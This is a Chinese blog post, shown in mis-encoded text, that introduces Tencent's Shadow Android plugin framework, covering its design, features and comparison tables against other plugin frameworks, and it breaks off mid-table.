                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»14åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€å¼•è¨€ï¼šä¸ºä»€ä¹ˆéœ€è¦æ’ä»¶åŒ–ï¼Ÿ</h2>
<p>åœ¨Androidå¼€å‘æ—¥ç›Šå¤æ‚çš„ä»Šå¤©ï¼Œæˆ‘ä»¬å¸¸å¸¸é¢ä¸´ä»¥ä¸‹ç—›ç‚¹ï¼š</p>
<ul>
<li><strong>åº”ç”¨ä½“ç§¯è†¨èƒ€</strong>ï¼šåŠŸèƒ½è¶ŠåŠ è¶Šå¤šï¼ŒAPKåŠ¨è¾„ä¸Šç™¾MBï¼Œç”¨æˆ·å®‰è£…æ„æ„¿ä¸‹é™ï¼›</li>
<li><strong>å‘ç‰ˆå‘¨æœŸé•¿</strong>ï¼šä¸€æ¬¡å°Bugä¿®å¤æˆ–æ´»åŠ¨ä¸Šçº¿ï¼Œéœ€èµ°å®Œæ•´åº”ç”¨å•†åº—å®¡æ ¸æµç¨‹ï¼ˆå°¤å…¶Google Playå®¡æ ¸é•¿è¾¾æ•°å¤©ï¼‰ï¼›</li>
<li><strong>ä¸šåŠ¡åŠ¨æ€åŒ–éœ€æ±‚å¼ºçƒˆ</strong>ï¼šè¥é”€æ´»åŠ¨ã€A/Bæµ‹è¯•ã€åŒºåŸŸå®šåˆ¶ç­‰åŠŸèƒ½ï¼Œè¦æ±‚â€œéšæ—¶ä¸Šçº¿ã€éšæ—¶ä¸‹çº¿â€ã€‚</li>
</ul>
<p>è¿™äº›åœºæ™¯å‚¬ç”Ÿäº†<strong>æ’ä»¶åŒ–ï¼ˆPlug-in Architectureï¼‰</strong> æŠ€æœ¯â€”â€”å°†éƒ¨åˆ†åŠŸèƒ½æ¨¡å—ä»ä¸»APKä¸­å‰¥ç¦»ï¼Œä»¥ç‹¬ç«‹æ’ä»¶å½¢å¼åŠ¨æ€åŠ è½½ï¼Œå®ç°<strong>å…å®‰è£…æ›´æ–°ã€æŒ‰éœ€åŠ è½½ã€æ¨¡å—è§£è€¦</strong>ã€‚</p>
<p><strong>æ’ä»¶åŒ–çš„æ ¸å¿ƒä»·å€¼</strong>ï¼š</p>
<ul>
<li><strong>æ¨¡å—åŒ–å¼€å‘</strong>ï¼šå°†å¤§å‹åº”ç”¨æ‹†è§£ä¸ºå¤šä¸ªç‹¬ç«‹åŠŸèƒ½æ¨¡å—ï¼›</li>
<li><strong>åŠ¨æ€æ›´æ–°</strong>ï¼šæ— éœ€é‡æ–°å‘å¸ƒæ•´åŒ…å³å¯ä¿®å¤Bugæˆ–ä¸Šçº¿æ–°åŠŸèƒ½ï¼›</li>
<li><strong>æŒ‰éœ€åŠ è½½</strong>ï¼šå‡å°ä¸»åŒ…ä½“ç§¯ï¼Œæå‡é¦–æ¬¡å®‰è£…ä½“éªŒï¼›</li>
<li><strong>å›¢é˜Ÿè§£è€¦</strong>ï¼šä¸åŒä¸šåŠ¡å¯ç”±ä¸åŒå›¢é˜Ÿå¹¶è¡Œå¼€å‘ã€ç‹¬ç«‹éƒ¨ç½²ã€‚</li>
</ul>
<p>ç„¶è€Œï¼Œç”±äºAndroidç³»ç»Ÿæœ¬èº«å¹¶æœªåŸç”Ÿæ”¯æŒæ’ä»¶åŒ–ï¼Œæ—©æœŸæ–¹æ¡ˆå¤šé‡‡ç”¨<strong>åå°„ + Hookç³»ç»Ÿå†…éƒ¨API</strong>çš„æ–¹å¼"æ¬ºéª—"ç³»ç»Ÿï¼Œå¯¼è‡´åœ¨é«˜ç‰ˆæœ¬Androidï¼ˆå°¤å…¶æ˜¯Android 9+ï¼‰ä¸Šå…¼å®¹æ€§æå·®ï¼Œç”šè‡³é¢‘ç¹å´©æºƒã€‚</p>
<h3 data-id="heading-1">æ’ä»¶åŒ–çš„æ¼”è¿›ä¹‹è·¯</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">æ’ä»¶åŒ–æŠ€æœ¯æ¼”è¿›æ—¶é—´çº¿ï¼š</span>
<span class="hljs-string">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="hljs-string">â”‚</span> <span class="hljs-number">2014</span><span class="hljs-number">-2016</span>             <span class="hljs-string">â”‚</span> <span class="hljs-number">2016</span><span class="hljs-number">-2018</span>               <span class="hljs-string">â”‚</span> <span class="hljs-number">2019</span><span class="hljs-string">-è‡³ä»Š</span>              <span class="hljs-string">â”‚</span>
<span class="hljs-string">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="hljs-string">â”‚</span> <span class="hljs-string">ç¬¬ä¸€ä»£ï¼šé‡åº¦Hookæ–¹æ¡ˆ</span>     <span class="hljs-string">â”‚</span> <span class="hljs-string">ç¬¬äºŒä»£ï¼šè™šæ‹ŸåŒ–æ–¹æ¡ˆ</span>        <span class="hljs-string">â”‚</span> <span class="hljs-string">ç¬¬ä¸‰ä»£ï¼šåˆè§„åŒ–æ–¹æ¡ˆ</span>        <span class="hljs-string">â”‚</span>
<span class="hljs-string">â”‚</span> <span class="hljs-string">DroidPlugin</span>          <span class="hljs-string">â”‚</span> <span class="hljs-string">VirtualApp/VAExposed</span>   <span class="hljs-string">â”‚</span> <span class="hljs-string">Shadow</span>                 <span class="hljs-string">â”‚</span>
<span class="hljs-string">â”‚</span> <span class="hljs-string">å¤§é‡åå°„ç§æœ‰API</span>         <span class="hljs-string">â”‚</span> <span class="hljs-string">æ„å»ºè½»é‡çº§Androidè™šæ‹Ÿæœº</span>    <span class="hljs-string">â”‚</span> <span class="hljs-string">é›¶åå°„ã€é›¶Hook</span>           <span class="hljs-string">â”‚</span>
<span class="hljs-string">â”‚</span> <span class="hljs-string">å…¼å®¹æ€§å·®ã€é£é™©é«˜</span>         <span class="hljs-string">â”‚</span> <span class="hljs-string">æ€§èƒ½æŸè€—å¤§ã€å®‰å…¨é£é™©é«˜</span>     <span class="hljs-string">â”‚</span> <span class="hljs-string">å…¨åŠ¨æ€ã€å¯ä¸Šæ¶</span>            <span class="hljs-string">â”‚</span>
<span class="hljs-string">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre>
<p>æ—©æœŸæ’ä»¶åŒ–æ–¹æ¡ˆå¦‚<strong>DroidPlugin</strong>ï¼ˆç¬¬ä¸€ä»£ï¼‰é€šè¿‡å¤§é‡Hookç³»ç»ŸæœåŠ¡ï¼ˆå¦‚AMSã€PMSï¼‰å®ç°ç»„ä»¶å¯åŠ¨ï¼Œè™½åŠŸèƒ½å¼ºå¤§ï¼Œä½†ä¸¥é‡ä¾èµ–åå°„å’Œç§æœ‰APIï¼›<br/>
ç¬¬äºŒä»£å¦‚<strong>VirtualApp/VAExposed</strong>åˆ™èµ°å‘"è™šæ‹ŸåŒ–"è·¯çº¿ï¼Œè¿‘ä¹æ„å»ºäº†ä¸€ä¸ªè½»é‡çº§Androidè™šæ‹Ÿæœºï¼Œå…¼å®¹æ€§å·®ã€æ€§èƒ½æŸè€—å¤§ã€å®‰å…¨é£é™©é«˜ã€‚</p>
<p>è€Œå¦‚ä»Šï¼Œåœ¨Googleå¯¹éSDKæ¥å£æ—¥ç›Šä¸¥è‹›çš„é™åˆ¶ä¸‹ï¼ˆAndroid 9+çš„greylist/blacklistæœºåˆ¶ï¼‰ï¼Œ<strong>Hookå’Œåå°„å·²æˆ"æŠ€æœ¯è´Ÿå€º"</strong>ã€‚</p>
<p>æ­£æ˜¯åœ¨æ­¤èƒŒæ™¯ä¸‹ï¼Œè…¾è®¯å¼€æºäº†<strong>Shadow</strong>â€”â€”ä¸€æ¬¾<strong>é›¶åå°„ã€é›¶Hookã€å…¨åŠ¨æ€ã€åˆè§„å¯ä¸Šæ¶</strong>çš„ç¬¬ä¸‰ä»£æ’ä»¶åŒ–æ¡†æ¶ï¼Œè¢«ä¸šç•Œèª‰ä¸º"æ’ä»¶åŒ–çš„ç»ˆææ–¹æ¡ˆ"ã€‚</p>
<blockquote>
<p>ä¸€ä¸ªç»è¿‡çº¿ä¸Šäº¿çº§ç”¨æˆ·é‡æ£€éªŒçš„åå°„å…¨åŠ¨æ€Androidæ’ä»¶æ¡†æ¶ã€‚</p>
</blockquote>
<h2 data-id="heading-2">äºŒã€Shadowæ¡†æ¶åŸºæœ¬ä»‹ç»</h2>
<h3 data-id="heading-3">å®˜æ–¹å®šä¹‰</h3>
<blockquote>
<p><strong>Shadowæ˜¯è…¾è®¯å¼€æºçš„é›¶åå°„ã€é›¶Hookçš„Androidæ’ä»¶åŒ–æ¡†æ¶</strong>ï¼Œå…¶æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š<strong>å®¿ä¸»ä¸æ’ä»¶å®Œå…¨è§£è€¦ï¼Œæ’ä»¶æ˜¯ä¸€ä¸ª"å®Œæ•´APK"ï¼Œå®¿ä¸»ä»…æä¾›è¿è¡Œå®¹å™¨</strong>ã€‚</p>
</blockquote>
<h3 data-id="heading-4">æ ¸å¿ƒç†å¿µ</h3>
<ul>
<li>
<p><strong>ç»„ä»¶"å®Œå…¨ä½“"æ¨¡å‹</strong><br/>
æ¯ä¸ªæ’ä»¶APKå¯ç‹¬ç«‹ç¼–è¯‘ã€æ‹¥æœ‰è‡ªå·±çš„<code>Application</code>ã€<code>Resources</code>ã€<code>ClassLoader</code>ï¼Œå°±åƒä¸€ä¸ªæ™®é€šAppã€‚</p>
</li>
<li>
<p><strong>å®¿ä¸»ä»…æä¾›"å®¹å™¨"</strong><br/>
ä¸åŠ«æŒç³»ç»Ÿæœºåˆ¶ï¼Œè€Œæ˜¯é€šè¿‡<strong>å¤ç”¨æ ‡å‡†Android API + ç¼–è¯‘æœŸä»£ç è½¬æ¢</strong>ï¼Œå®ç°æ’ä»¶ç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸç®¡ç†ã€‚</p>
</li>
</ul>
<p>è¿™æ„å‘³ç€ï¼š<strong>æ’ä»¶å¼€å‘ä½“éªŒ â‰ˆ åŸç”ŸAppå¼€å‘</strong>ï¼Œæ— éœ€ç»§æ‰¿ç‰¹æ®ŠåŸºç±»ï¼Œä¹Ÿæ— éœ€ç†è§£å¤æ‚Hooké€»è¾‘ã€‚</p>
<h2 data-id="heading-5">ä¸‰ã€Shadowçš„æ ¸å¿ƒç‰¹ç‚¹ä¸ä¼˜åŠ¿</h2>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[Shadowæ ¸å¿ƒä¼˜åŠ¿] --&gt; B1[é›¶åå°„é›¶Hook]
    A --&gt; B2[å››å¤§ç»„ä»¶å…¨æ”¯æŒ]
    A --&gt; B3[å…¨åŠ¨æ€æ¡†æ¶]
    A --&gt; B4[æä½å®¿ä¸»å¢é‡]
    A --&gt; B5[é«˜æ€§èƒ½ä½æŸè€—]
    A --&gt; B6[æ’ä»¶é«˜åº¦ç‹¬ç«‹]
    
    B1 --&gt; C1[è§„é¿åå°„è°ƒç”¨]
    B1 --&gt; C2[å…¼å®¹Android 5-14]
    B1 --&gt; C3[å¯é€šè¿‡Google Playå®¡æ ¸]
    
    B2 --&gt; C4[æ— éœ€Manifesté¢„æ³¨å†Œ]
    B2 --&gt; C5[åŠ¨æ€ç»„ä»¶è°ƒåº¦]
    
    B3 --&gt; C6[æ¡†æ¶ä»£ç åŠ¨æ€æ›´æ–°]
    B3 --&gt; C7[çªç ´å®¿ä¸»ç‰ˆæœ¬é™åˆ¶]
    
    B4 --&gt; C8[ä»…15KBå¢é‡]
    B4 --&gt; C9[160æ–¹æ³•æ•°]
    
    B5 --&gt; C10[ç‹¬ç«‹ClassLoader]
    B5 --&gt; C11[å†…å­˜å¯æ§]
    B5 --&gt; C12[å¯åŠ¨å¿«+10-30ms]
    
    B6 --&gt; C13[ç‹¬ç«‹ç¼–è¯‘è°ƒè¯•]
    B6 --&gt; C14[èµ„æºå®Œå…¨éš”ç¦»]
</code></pre>
<h3 data-id="heading-6">âœ… ç‰¹ç‚¹1ï¼šé›¶åå°„ã€é›¶Hook</h3>
<ul>
<li>
<p><strong>å®ç°åŸç†</strong>ï¼šé€šè¿‡<strong>å­—èŠ‚ç æ’æ¡©ï¼ˆASMï¼‰+ åŠ¨æ€ä»£ç† + æ¥å£å¥‘çº¦</strong>ï¼Œåœ¨ç¼–è¯‘æœŸé‡å†™æ’ä»¶ä¸­å¯¹<code>Context</code>ã€<code>startActivity</code>ç­‰è°ƒç”¨ï¼Œæ›¿æ¢ä¸ºShadow Runtimeæä¾›çš„ä»£ç†å®ç°ã€‚</p>
</li>
<li>
<p><strong>ä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>å®Œå…¨è§„é¿<code>Instrumentation</code>ã€<code>Handler</code>ã€<code>ActivityThread</code>ç­‰æ•æ„Ÿç±»çš„åå°„è°ƒç”¨ï¼›</li>
<li>å…¼å®¹Android 5.0ï½Android 14ï¼ŒåŒ…æ‹¬åä¸ºã€å°ç±³ç­‰æ·±åº¦å®šåˆ¶ROMï¼›</li>
<li><strong>å¯é€šè¿‡Google Playå®¡æ ¸</strong>ï¼Œæ— æ”¿ç­–é£é™©ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-7">âœ… ç‰¹ç‚¹2ï¼šå››å¤§ç»„ä»¶å…¨æ”¯æŒ</h3>
<ul>
<li>å®Œæ•´æ”¯æŒ<code>Activity</code>ã€<code>Service</code>ã€<code>BroadcastReceiver</code>ã€<code>ContentProvider</code>ï¼›</li>
<li><strong>æ— éœ€åœ¨å®¿ä¸»Manifestä¸­é¢„æ³¨å†Œ</strong>ï¼šé€šè¿‡é¢„åŸ‹çš„"å ä½Activity"ï¼ˆStub Activityï¼‰ç»•è¿‡AMSæ ¡éªŒï¼Œç”±Shadow RuntimeåŠ¨æ€è°ƒåº¦çœŸå®æ’ä»¶ç»„ä»¶ã€‚</li>
</ul>
<h3 data-id="heading-8">âœ… ç‰¹ç‚¹3ï¼šå…¨åŠ¨æ€æ’ä»¶æ¡†æ¶</h3>
<p>ä¸€æ¬¡æ€§å®ç°å®Œç¾çš„æ’ä»¶æ¡†æ¶å¾ˆéš¾ï¼Œä½†Shadowå°†è¿™äº›å®ç°å…¨éƒ¨åŠ¨æ€åŒ–èµ·æ¥ï¼Œä½¿æ’ä»¶æ¡†æ¶çš„ä»£ç æˆä¸ºäº†æ’ä»¶çš„ä¸€éƒ¨åˆ†ã€‚æ’ä»¶çš„è¿­ä»£ä¸å†å—å®¿ä¸»æ‰“åŒ…äº†æ—§ç‰ˆæœ¬æ’ä»¶æ¡†æ¶æ‰€é™åˆ¶ã€‚</p>
<h3 data-id="heading-9">âœ… ç‰¹ç‚¹4ï¼šå®¿ä¸»å¢é‡æå°</h3>
<p>å¾—ç›Šäºå…¨åŠ¨æ€å®ç°ï¼ŒçœŸæ­£åˆå…¥å®¿ä¸»ç¨‹åºçš„ä»£ç é‡æå°ï¼ˆ15KBï¼Œ160æ–¹æ³•æ•°å·¦å³ï¼‰ã€‚</p>
<h3 data-id="heading-10">âœ… ç‰¹ç‚¹5ï¼šæ€§èƒ½ä¸ä½æŸè€—</h3>
<ul>
<li><strong>ç‹¬ç«‹ClassLoader</strong>ï¼šé¿å…ç±»å†²çªï¼Œæ”¯æŒå¤šç‰ˆæœ¬æ’ä»¶å…±å­˜ï¼›</li>
<li><strong>å†…å­˜å¯æ§</strong>ï¼šæ’ä»¶å¯åŠ¨æ€å¸è½½ï¼Œé‡Šæ”¾èµ„æºï¼›</li>
<li><strong>å¯åŠ¨å¿«</strong>ï¼šå®æµ‹æ’ä»¶Activityå¯åŠ¨è€—æ—¶ â‰ˆ åŸç”ŸActivity + 10ï½30msã€‚</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3a26c1b165145209a043f259c0e9170~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bmP56iL5Y2B5YWr5bCR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769040496&amp;x-signature=p7rOuG227VjSK5OO3Ca27X8crfo%3D" alt="114.jpg" loading="lazy"/></p>
<h3 data-id="heading-11">âœ… ç‰¹ç‚¹6ï¼šæ’ä»¶é«˜åº¦ç‹¬ç«‹</h3>
<ul>
<li><strong>ç‹¬ç«‹ç¼–è¯‘ä¸è°ƒè¯•</strong>ï¼šæ’ä»¶å¯ä½œä¸ºæ™®é€šAppè¿è¡Œï¼Œæ”¯æŒæ–­ç‚¹è°ƒè¯•ã€å•å…ƒæµ‹è¯•ï¼›</li>
<li><strong>èµ„æºéš”ç¦»</strong>ï¼šé€šè¿‡ä¿®æ”¹aaptç”Ÿæˆå›ºå®šèµ„æºIDï¼Œå½»åº•è§£å†³æ’ä»¶é—´æˆ–æ’ä»¶ä¸å®¿ä¸»çš„èµ„æºå†²çªã€‚</li>
</ul>
<p>é™¤æ­¤ä¹‹å¤–ï¼ŒShadowæ”¯æŒçš„ç‰¹æ€§æœ‰ï¼š</p>
<ul>
<li>å››å¤§ç»„ä»¶</li>
<li>Fragmentï¼ˆä»£ç æ·»åŠ å’ŒXmlæ·»åŠ ï¼‰</li>
<li>DataBindingï¼ˆæ— éœ€ç‰¹åˆ«æ”¯æŒï¼Œä½†å·²éªŒè¯å¯æ­£å¸¸å·¥ä½œï¼‰</li>
<li>è·¨è¿›ç¨‹ä½¿ç”¨æ’ä»¶Service</li>
<li>è‡ªå®šä¹‰Theme</li>
<li>æ’ä»¶è®¿é—®å®¿ä¸»ç±»</li>
<li>SoåŠ è½½</li>
<li>åˆ†æ®µåŠ è½½æ’ä»¶ï¼ˆå¤šApkåˆ†åˆ«åŠ è½½æˆ–å¤šApkä»¥æ­¤ä¾èµ–åŠ è½½ï¼‰</li>
<li>ä¸€ä¸ªActivityä¸­åŠ è½½å¤šä¸ªApkä¸­çš„View</li>
</ul>
<h2 data-id="heading-12">å››ã€Shadow vs å…¶ä»–æ’ä»¶åŒ–æ¡†æ¶ï¼šä¸ºä½•å®ƒæ˜¯"ç»ˆææ–¹æ¡ˆ"ï¼Ÿ</h2>





























































<table><thead><tr><th>ç»´åº¦</th><th><strong>Shadow</strong></th><th>RePlugin</th><th>VirtualAPK</th><th>DroidPlugin</th></tr></thead><tbody><tr><td><strong>Hook/åå°„ä¾èµ–</strong></td><td>âŒ æ— </td><td>âš ï¸ å°‘é‡åå°„</td><td>âœ… é‡åº¦Hook</td><td>âœ… é‡åº¦Hook</td></tr><tr><td><strong>å››å¤§ç»„ä»¶æ”¯æŒ</strong></td><td>âœ… å…¨æ”¯æŒ</td><td>âš ï¸ ä¸»è¦æ”¯æŒActivity</td><td>âœ… å…¨æ”¯æŒ</td><td>âœ… å…¨æ”¯æŒ</td></tr><tr><td><strong>Android 14å…¼å®¹</strong></td><td>âœ… å®˜æ–¹é€‚é…</td><td>âŒ éœ€è‡ªè¡Œç»´æŠ¤</td><td>âŒ åŸºæœ¬ä¸å¯ç”¨</td><td>âŒ å·²åœæ­¢ç»´æŠ¤</td></tr><tr><td><strong>Google Playåˆè§„</strong></td><td>âœ… å¯ä¸Šæ¶</td><td>âš ï¸ é«˜é£é™©</td><td>âŒ å‡ ä¹ä¸å¯èƒ½</td><td>âŒ ä¸å¯èƒ½</td></tr><tr><td><strong>æ’ä»¶å¼€å‘ä½“éªŒ</strong></td><td>âœ… å¦‚åŸç”ŸApp</td><td>âš ï¸ éœ€ç»§æ‰¿åŸºç±»</td><td>âŒ è°ƒè¯•å›°éš¾</td><td>âŒ ä¾µå…¥æ€§å¼º</td></tr><tr><td><strong>å®‰å…¨éš”ç¦»æ€§</strong></td><td>âœ… å¼ºï¼ˆæ¥å£å¥‘çº¦ï¼‰</td><td>âš ï¸ ä¸­</td><td>âŒ å¼±ï¼ˆæ²™ç®±ä¸å®Œå–„ï¼‰</td><td>âŒ å¼±</td></tr><tr><td><strong>ç»¼åˆæ¨èåº¦</strong></td><td><strong>â˜…â˜…â˜…â˜…â˜…</strong></td><td>â˜…â˜…â˜…â˜†</td><td>â˜…â˜…â˜†</td><td>â˜…â˜…</td></tr></tbody></table>
<blockquote>
<p>ğŸ’¡ <strong>å…³é”®ç»“è®º</strong>ï¼šShadowæ˜¯ç›®å‰<strong>å”¯ä¸€å…¼é¡¾åˆè§„æ€§ã€å…¼å®¹æ€§ã€åŠŸèƒ½æ€§ä¸å¼€å‘ä½“éªŒ</strong>çš„æ’ä»¶åŒ–æ–¹æ¡ˆã€‚</p>
</blockquote>
<p>åœ¨ç½‘ç«™ä¸Šå‘ç°ä¸€ä¸ªäººï¼ŒåŸºäºShadowä¼˜åŒ–ï¼Œæ’ä»¶çš„ä½“ç§¯å‡ ç™¾K! <strong>æ’ä»¶æé™ç˜¦èº«ä¼˜åŒ–</strong> WXDynamicPlugin!</p>
<p>å› ä¸ºä¸çŸ¥é“æœ‰æ²¡æœ‰é‡äº§ï¼Œæš‚æ—¶æ²¡å•†ç”¨ï¼Œæ€è·¯å¯ä»¥å‚è€ƒï¼Œä¸å»ºè®®ç›´æ¥ç”¨äºå…¬å¸é¡¹ç›®ï¼</p>
<p><a href="https://juejin.cn/post/7347994218235363382" target="_blank" title="https://juejin.cn/post/7347994218235363382">é›¶åå°„ï¼Œé›¶HooK,å…¨åŠ¨æ€åŒ–ï¼Œæ’ä»¶åŒ–æ¡†æ¶ï¼Œå…¨ç½‘å”¯ä¸€ç»“åˆå¯åŠ¨ä¼˜åŒ–çš„æ’ä»¶åŒ–æ¶æ„ï¼ˆä¸€ï¼‰è‡ªç ”é›¶åå°„ï¼Œé›¶HooK,å…¨åŠ¨æ€åŒ–ï¼Œæ’ä»¶åŒ– - æ˜é‡‘</a></p>
<h3 data-id="heading-13">ä½œè€…åœ¨åšå®¢ä¸­çš„åˆ†æï¼šï¼ˆå¾…éªŒè¯ï¼‰</h3>
<p>æ’ä»¶åŒ–æ¡†æ¶å¯¹æ¯” Shadow &amp;&amp; WXDynamicPlugin</p>




























































<table><thead><tr><th>æ’ä»¶åŒ–æ¡†æ¶</th><th>Shadow</th><th>WXDynamicPlugin</th></tr></thead><tbody><tr><td><strong>æ’ä»¶æ‰“åŒ…ä½“ç§¯</strong></td><td>3Mä»¥ä¸Š</td><td>500kå·¦å³</td></tr><tr><td><strong>æè‡´åŒ–ä¸‹è½½ç®¡ç†ç‰ˆæœ¬æ§åˆ¶</strong></td><td>éœ€è‡ªå·±å®ç°</td><td>1æ­¥åˆ°ä½</td></tr><tr><td><strong>æ’ä»¶åŠ è½½é€»è¾‘</strong></td><td>å®¿ä¸»-&gt;ç®¡ç†å™¨-&gt;æ’ä»¶</td><td>å®¿ä¸»-&gt;æ’ä»¶</td></tr><tr><td><strong>é¦–æ¬¡æ’ä»¶ä¸‹è½½åˆ°å±•ç¤ºé¦–é¡µè€—æ—¶</strong></td><td>3ï½5sä»¥ä¸Šï¼Ÿ</td><td>1så†…</td></tr><tr><td><strong>æ’ä»¶å·²ç»åˆ°æœ¬åœ°ååŠ è½½é€Ÿåº¦</strong></td><td>1500msä»¥ä¸Š</td><td>500mså†…</td></tr><tr><td><strong>å…¨åŠ¨æ€åŒ–</strong></td><td>æ”¯æŒ</td><td>æ”¯æŒ</td></tr><tr><td><strong>æ’ä»¶åŒ–æ¡†æ¶åŠ¨æ€åŒ–</strong></td><td>æ”¯æŒ</td><td>æ”¯æŒ</td></tr><tr><td><strong>ä¸‹è½½é€»è¾‘ä»£ç åŠ¨æ€åŒ–</strong></td><td>ä¸æ”¯æŒ</td><td>æ”¯æŒ</td></tr><tr><td><strong>ç‰ˆæœ¬æ§åˆ¶ä»£ç 